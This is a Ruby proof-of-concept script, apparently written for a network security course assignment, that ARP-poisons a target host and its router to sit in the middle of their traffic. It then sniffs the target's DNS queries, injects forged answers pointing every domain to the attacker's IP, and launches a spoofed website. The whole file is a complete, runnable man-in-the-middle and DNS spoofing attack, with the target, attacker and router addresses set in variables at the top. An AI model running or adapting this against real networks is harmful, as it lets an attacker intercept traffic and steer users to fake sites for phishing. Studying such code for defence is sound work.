#!/usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
--  SOURCE FILE:    spoof_dns.rb - Proof of concept application for arp poisoning and
--                                 DNS spoofing. Application acts as MITM sniffer 
--                                 for DNS traffic and injects crafted DNS responses
--                                 when a query is intercepted.
--
--  PROGRAM:        spoof_dns
--                  ./spoof_dns.rb
--
--  FUNCTIONS:      Crafted UDP packets, libpcap, multi-threading
--
--  Ruby Gems required:     packetfu
--                          https://rubygems.org/gems/packetfu
--                      
--  DATE:           May/June 2014
--
--  REVISIONS:      See development repo: https://github.com/deuterium/comp8505-assign3
--
--  DESIGNERS:      Chris Wood - chriswood.ca@gmail.com
--
--  PROGRAMMERS:    Chris Wood - chriswood.ca@gmail.com
--  
--  NOTES:          This builds on the ARP poisoning examples from class.
---------------------------------------------------------------------------------------
=end
require 'packetfu'
require 'thread'

## User defined variables
@target_ip   = "192.168.1.100"  # IP of the host you would like to target
#@target_mac  = "bc:f5:ac:e2:c6:28" #android
@target_mac  = "b8:ac:6f:34:ad:d8"
@sender_ip   = "192.168.1.101"  # Your IP, or the attacking IP (MITM)
@sender_mac  = "7c:7a:91:7d:2b:02"
@router_ip   = "192.168.1.1"    # IP of the router on the network to ARP Poison
@router_mac  = "00:22:6b:7c:9b:12"
@iface       = "wlp2s0"         # Name of the primary network interface 

## DO NOT EDIT BELOW THIS LINE
## Functions

# Starts the arp spoofing thread. Sends out crafted packets
# to the telling the router that this mac is the client, and
# to the client telling it that it is the router.
# @param [String] arp_packet_target
# - Crafted UDP packet for target
# @param [String] arp_packet_router
# - Crafted UDP packet for router
def runspoof(arp_packet_target,arp_packet_router)
  # Send out both packets
  puts "ARP Posioning Thread Started"
  caught=false
  while caught==false do
    sleep 1
    arp_packet_target.to_w(@iface)
    arp_packet_router.to_w(@iface)
  end
end

# Starts the DNS sniffing and spoofing thread.
# Looks for DNS queries coming from the target
# and responds to them with crafted responses.
# @param [String] t_ip
# - IP address of target
def spoof_dns(t_ip)
  puts "DNS Spoofing Thread Started"
  #look for dns packets from target
  filter = "udp and port 53 and src " + t_ip
  #filter = "udp and port 53"

  begin
    cap = PacketFu::Capture.new(:iface => @iface,
      :start => true,
      :promisc => true,
      :filter=> filter)
    cap.stream.each do |p|
      pkt = PacketFu::Packet.parse(p)
      if pkt.is_udp?
        #check if query
        dns_hdr_flag = pkt.payload[2].unpack('h*')[0].chr+pkt.payload[3].unpack('h*')[0].chr
        if dns_hdr_flag == '10'
          domain_name = extract_domain(pkt.payload[13..-1])

          puts "Domain name is: #{domain_name}"

          #build and send response
          send_dns_response(pkt, domain_name)
        end
      end
    end
  rescue Exception => ex
    puts "something bad happening in dns"
    puts ex.message
    puts ex.backtrace
  end
end

# Extracts and builds domain name in canonical format
# ie. www.website.tld
# @param [String] q_name
# - domain name in dns header payload format
def extract_domain(q_name)
  #take q name and extract all subdomains

  domain_name = ""
  n = 0
  loop {
    if q_name[n].unpack('H*') == ["00"]
      return domain_name
    elsif !q_name[n].match(/^[[:alpha:]]$/) #hex and not 0x00
      domain_name += '.'
      n += 1
    else
      domain_name += q_name[n]
      n += 1
    end 
  }
end

# Crafts a DNS response based on a DNS Query requested
# from target client. Builds and recalcs the packets
# and puts it on the wire.
# @param [PacketFu::Packet] orig_pkt
# - the original DNS packet intercepted from client
# @param [String] name
# - canonical comain name
def send_dns_response(orig_pkt, name)
  #UDP/IP headers
  #dns_resp = PacketFu::UDPPacket.new(:config => PacketFu::Utils.whoami?(:iface => @iface))
  dns_resp = PacketFu::UDPPacket.new
  dns_resp.eth_saddr = @sender_mac
  dns_resp.eth_daddr = @target_mac
  dns_resp.udp_dst   = orig_pkt.udp_src.to_i
  dns_resp.udp_src   = "53"
  dns_resp.ip_saddr  = orig_pkt.ip_saddr
  dns_resp.ip_daddr  = @target_ip

  #DNS header
  #copy transaction ID from original query to response
  transID1 = orig_pkt.payload[0].unpack('H*')[0]
  transID2 = orig_pkt.payload[1].unpack('H*')[0]
  transID = transID1.hex.chr + transID2.hex.chr
  tmp_payload = transID

  #tmp_payload = orig_pkt.payload[0,2].unpack
  tmp_payload += "\x81\x80".force_encoding('ASCII-8BIT')          # resp code
  tmp_payload += "\x00\x01\x00\x01".force_encoding('ASCII-8BIT')  # question amt & answer RR
  tmp_payload += "\x00\x00\x00\x00".force_encoding('ASCII-8BIT')  # auth and additional RR

  #Domain Name
  name.split('.').each do |part|
    tmp_payload += part.length.chr
    tmp_payload += part
  end

  #Rest of DNS Header (defaults from notes)
  tmp_payload += "\x00\x00\x01".force_encoding('ASCII-8BIT') + "\x00\x01".force_encoding('ASCII-8BIT') #type and class

  # DNS ANSWER
  tmp_payload += "\xc0\x0c".force_encoding('ASCII-8BIT')          #name
  tmp_payload += "\x00\x01".force_encoding('ASCII-8BIT')          #type
  tmp_payload += "\x00\x01".force_encoding('ASCII-8BIT')          #class
  tmp_payload += "\x00\x00\x00\x15".force_encoding('ASCII-8BIT')  #TTL
  tmp_payload += "\x00\x04".force_encoding('ASCII-8BIT')          #data len
  #Spoofed IP
  ip_ary = @sender_ip.split('.')
  tmp_payload += [ip_ary[0].to_i, ip_ary[1].to_i, ip_ary[2].to_i, ip_ary[3].to_i].pack('c*')

  dns_resp.payload = tmp_payload

  #Bundle and send
  dns_resp.recalc
  dns_resp.to_w(@iface)
end

## Main

# Construct the target's packet
arp_packet_target = PacketFu::ARPPacket.new()
arp_packet_target.eth_saddr     = @sender_mac       # sender's MAC address
arp_packet_target.eth_daddr     = @target_mac       # target's MAC address
arp_packet_target.arp_saddr_mac = @sender_mac       # sender's MAC address
arp_packet_target.arp_daddr_mac = @target_mac       # target's MAC address
arp_packet_target.arp_saddr_ip  = @router_ip        # router's IP
arp_packet_target.arp_daddr_ip  = @target_ip        # target's IP
arp_packet_target.arp_opcode    = 2                 # arp code 2 == ARP reply
 
# Construct the router's packet
arp_packet_router = PacketFu::ARPPacket.new()
arp_packet_router.eth_saddr     = @sender_mac       # sender's MAC address
arp_packet_router.eth_daddr     = @router_mac       # router's MAC address
arp_packet_router.arp_saddr_mac = @sender_mac       # sender's MAC address
arp_packet_router.arp_daddr_mac = @router_mac       # router's MAC address
arp_packet_router.arp_saddr_ip  = @target_ip        # target's IP
arp_packet_router.arp_daddr_ip  = @router_ip        # router's IP
arp_packet_router.arp_opcode    = 2                 # arp code 2 == ARP reply

# Enable IP forwarding
`echo 1 > /proc/sys/net/ipv4/ip_forward`

begin
  puts "Starting the ARP poisoning thread..."
  spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)} 
  puts "Starting the DNS spoofing thread..."
  dns_thread = Thread.new{spoof_dns(@target_ip)}
  puts "Starting the spoofed website thread..."
  web_thread = Thread.new{`ruby site.rb`} #probably a better way to run this in the code, but good enough
  spoof_thread.join
  dns_thread.join
  web_thread.join
rescue Interrupt # Catch the interrupt and kill the thread
  puts "\nARP spoof stopped by interrupt signal."
  Thread.kill(spoof_thread)
  puts "DNS spoof stopped by interrupt signal."
  Thread.kill(dns_thread)
  puts "Web spoof stopped by interrupt signal."
  Thread.kill(web_thread)
  `echo 0 > /proc/sys/net/ipv4/ip_forward`
  exit 0
end